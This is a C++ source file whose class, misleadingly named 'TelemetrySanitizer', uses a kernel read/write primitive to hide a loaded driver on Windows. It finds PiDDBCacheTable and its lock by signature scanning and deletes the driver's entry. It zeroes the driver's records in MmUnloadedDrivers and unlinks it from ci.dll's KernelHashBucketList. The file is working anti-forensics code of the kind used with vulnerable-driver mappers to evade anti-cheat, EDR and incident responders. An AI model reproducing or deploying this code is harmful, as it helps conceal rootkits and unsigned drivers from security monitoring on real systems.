#include "../include/telemetry_sanitizer.hpp"
#include <iostream>

namespace nocturne {

TelemetrySanitizer::TelemetrySanitizer(CarrierIo& io, const MapperConfig& cfg)
    : m_io(io), m_cfg(cfg) {
    m_cfg.symbols = io.ResolvedSymbols();
}

bool TelemetrySanitizer::AcquireResourceExclusive(uint64_t resourcePtr, bool wait) {
    uint64_t fnAcquire = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "ExAcquireResourceExclusiveLite");
    if (!fnAcquire || !resourcePtr) return false;
    BOOLEAN acquired = FALSE;
    return m_io.CallKernelFunction(&acquired, fnAcquire, resourcePtr, static_cast<BOOLEAN>(wait ? TRUE : FALSE)) && acquired != FALSE;
}

bool TelemetrySanitizer::ReleaseResource(uint64_t resourcePtr) {
    uint64_t fnRelease = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "ExReleaseResourceLite");
    if (!fnRelease || !resourcePtr) return false;
    uint64_t dummy = 0;
    return m_io.CallKernelFunction(&dummy, fnRelease, resourcePtr);
}

bool TelemetrySanitizer::ClearPiDDBCacheTable(const std::wstring& driverFileName, uint32_t timeDateStamp) {
    uint64_t piddbLockVa = 0;
    uint64_t piddbTableVa = 0;

    if (m_cfg.symbols.rvaPiDDBLock && m_cfg.symbols.rvaPiDDBCacheTable) {
        piddbLockVa = m_io.NtoskrnlBase() + m_cfg.symbols.rvaPiDDBLock;
        piddbTableVa = m_io.NtoskrnlBase() + m_cfg.symbols.rvaPiDDBCacheTable;
    } else {
        // Windows 10 / 11 PiDDBLock & PiDDBCacheTable signature patterns in PAGE section
        uint64_t lockRef = m_io.FindPatternInModule(
            m_io.NtoskrnlBase(),
            "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x8C",
            "xxx????x????xxx",
            "PAGE"
        );
        if (!lockRef) {
            lockRef = m_io.FindPatternInModule(
                m_io.NtoskrnlBase(),
                "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\x0D",
                "xxx????x????xxx",
                "PAGE"
            );
        }
        if (lockRef) {
            piddbLockVa = m_io.ResolveRelativeRip(lockRef, 3, 7);
        }

        uint64_t tableRef = m_io.FindPatternInModule(
            m_io.NtoskrnlBase(),
            "\x66\x03\xD2\x48\x8D\x0D",
            "xxxxxx",
            "PAGE"
        );
        if (tableRef) {
            piddbTableVa = m_io.ResolveRelativeRip(tableRef + 3, 3, 7);
        }
    }

    if (!piddbLockVa || !piddbTableVa) {
        return false;
    }

    uint64_t fnLookupAvl = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "RtlLookupElementGenericTableAvl");
    uint64_t fnDeleteAvl = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "RtlDeleteElementGenericTableAvl");
    if (!fnLookupAvl || !fnDeleteAvl) return false;

    if (!AcquireResourceExclusive(piddbLockVa, true)) return false;

    // Allocate temporary kernel buffer for UNICODE_STRING + driverName + PiDDBCacheEntry lookup key
    uint64_t exAllocPool = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "ExAllocatePoolWithTag");
    uint64_t exFreePool = m_io.GetKernelModuleExport(m_io.NtoskrnlBase(), "ExFreePoolWithTag");
    uint64_t scratchKernel = 0;
    bool cleaned = false;

    if (m_io.CallKernelFunction(&scratchKernel, exAllocPool, 0U, 0x200ULL, m_cfg.poolTag) && scratchKernel) {
        uint64_t strKernelAddr = scratchKernel + sizeof(PiDDBCacheEntry);
        size_t strByteLen = driverFileName.size() * sizeof(wchar_t);
        m_io.WriteKernelVirtual(strKernelAddr, driverFileName.data(), strByteLen);

        PiDDBCacheEntry lookupEntry{};
        lookupEntry.timeDateStamp = timeDateStamp;
        lookupEntry.driverName.Length = static_cast<USHORT>(strByteLen);
        lookupEntry.driverName.MaximumLength = static_cast<USHORT>(strByteLen + sizeof(wchar_t));
        lookupEntry.driverName.Buffer = reinterpret_cast<PWSTR>(strKernelAddr);
        m_io.WriteKernelVirtual(scratchKernel, &lookupEntry, sizeof(lookupEntry));

        uint64_t foundEntryVa = 0;
        if (m_io.CallKernelFunction(&foundEntryVa, fnLookupAvl, piddbTableVa, scratchKernel) && foundEntryVa) {
            PiDDBCacheEntry found{};
            if (m_io.ReadVal(foundEntryVa, found)) {
                // Unlink doubly-linked LIST_ENTRY
                uint64_t flink = reinterpret_cast<uint64_t>(found.list.Flink);
                uint64_t blink = reinterpret_cast<uint64_t>(found.list.Blink);
                if (flink && blink) {
                    m_io.WriteVal(blink + offsetof(LIST_ENTRY, Flink), flink);
                    m_io.WriteVal(flink + offsetof(LIST_ENTRY, Blink), blink);
                }
                BOOLEAN deleted = FALSE;
                if (m_io.CallKernelFunction(&deleted, fnDeleteAvl, piddbTableVa, foundEntryVa) && deleted) {
                    cleaned = true;
                }
            }
        }
        uint64_t dummy = 0;
        m_io.CallKernelFunction(&dummy, exFreePool, scratchKernel, m_cfg.poolTag);
    }

    ReleaseResource(piddbLockVa);
    return cleaned;
}

bool TelemetrySanitizer::ClearMmUnloadedDrivers(const std::wstring& driverFileName) {
    uint64_t mmUnloadedDriversPtrVa = 0;
    uint64_t mmLastUnloadedDriverVa = 0;

    if (m_cfg.symbols.rvaMmUnloadedDrivers && m_cfg.symbols.rvaMmLastUnloadedDriver) {
        mmUnloadedDriversPtrVa = m_io.NtoskrnlBase() + m_cfg.symbols.rvaMmUnloadedDrivers;
        mmLastUnloadedDriverVa = m_io.NtoskrnlBase() + m_cfg.symbols.rvaMmLastUnloadedDriver;
    } else {
        uint64_t ref = m_io.FindPatternInModule(
            m_io.NtoskrnlBase(),
            "\x4C\x8B\x00\x00\x00\x00\x00\x4C\x8B\xC9\x4D\x85\x00\x74",
            "xx?????xxxxx?x",
            "PAGE"
        );
        if (ref) {
            mmUnloadedDriversPtrVa = m_io.ResolveRelativeRip(ref, 3, 7);
        }
    }

    if (!mmUnloadedDriversPtrVa) return false;

    uint64_t arrayBase = 0;
    if (!m_io.ReadVal(mmUnloadedDriversPtrVa, arrayBase) || !arrayBase) return false;

    bool scrubbedAny = false;
    for (uint32_t i = 0; i < 50; ++i) {
        uint64_t entryVa = arrayBase + i * sizeof(MmUnloadedDriverEntry);
        MmUnloadedDriverEntry entry{};
        if (!m_io.ReadVal(entryVa, entry)) continue;
        if (!entry.name.Buffer || entry.name.Length == 0 || entry.name.Length > 256) continue;

        std::wstring nameBuf(entry.name.Length / sizeof(wchar_t), L'\0');
        if (!m_io.ReadKernelVirtual(reinterpret_cast<uint64_t>(entry.name.Buffer), nameBuf.data(), entry.name.Length)) continue;

        if (_wcsicmp(nameBuf.c_str(), driverFileName.c_str()) == 0) {
            std::vector<uint8_t> zeroName(entry.name.MaximumLength, 0);
            m_io.WriteKernelVirtual(reinterpret_cast<uint64_t>(entry.name.Buffer), zeroName.data(), zeroName.size());
            MmUnloadedDriverEntry emptyEntry{};
            m_io.WriteVal(entryVa, emptyEntry);
            scrubbedAny = true;
        }
    }

    if (mmLastUnloadedDriverVa && scrubbedAny) {
        uint32_t count = 0;
        if (m_io.ReadVal(mmLastUnloadedDriverVa, count) && count > 0) {
            --count;
            m_io.WriteVal(mmLastUnloadedDriverVa, count);
        }
    }
    return scrubbedAny;
}

bool TelemetrySanitizer::ClearKernelHashBucketList(const std::wstring& driverFileName) {
    uint64_t ciBase = m_io.GetKernelModuleBase("ci.dll");
    if (!ciBase) return false;

    uint64_t bucketListVa = 0;
    uint64_t hashLockVa = 0;

    if (!m_cfg.symbols.rvaKernelHashBucketList) return false;
    bucketListVa = ciBase + m_cfg.symbols.rvaKernelHashBucketList;
    if (m_cfg.symbols.rvaHashCacheLock) {
        hashLockVa = ciBase + m_cfg.symbols.rvaHashCacheLock;
    }

    if (hashLockVa) AcquireResourceExclusive(hashLockVa, true);

    uint64_t prevAddr = bucketListVa;
    uint64_t curEntryVa = 0;
    bool removed = false;

    if (m_io.ReadVal(bucketListVa, curEntryVa)) {
        int safetyLimit = 0;
        while (curEntryVa && (curEntryVa & 0xFFFF800000000000ULL) == 0xFFFF800000000000ULL && ++safetyLimit < 512) {
            HashBucketEntry entry{};
            if (!m_io.ReadVal(curEntryVa, entry)) break;

            if (entry.driverName.Buffer && entry.driverName.Length > 0 && entry.driverName.Length < 512) {
                std::wstring pathStr(entry.driverName.Length / sizeof(wchar_t), L'\0');
                if (m_io.ReadKernelVirtual(reinterpret_cast<uint64_t>(entry.driverName.Buffer), pathStr.data(), entry.driverName.Length)) {
                    if (pathStr.find(driverFileName) != std::wstring::npos) {
                        uint64_t nextPtr = reinterpret_cast<uint64_t>(entry.next);
                        m_io.WriteVal(prevAddr, nextPtr);
                        removed = true;
                        curEntryVa = nextPtr;
                        continue;
                    }
                }
            }
            prevAddr = curEntryVa + offsetof(HashBucketEntry, next);
            curEntryVa = reinterpret_cast<uint64_t>(entry.next);
        }
    }

    if (hashLockVa) ReleaseResource(hashLockVa);
    return removed;
}

bool TelemetrySanitizer::SanitizeAll(const std::wstring& driverFileName, uint32_t timeDateStamp) {
    bool a = ClearPiDDBCacheTable(driverFileName, timeDateStamp);
    bool b = ClearMmUnloadedDrivers(driverFileName);
    bool c = ClearKernelHashBucketList(driverFileName);
    return a || b || c;
}

} // namespace nocturne
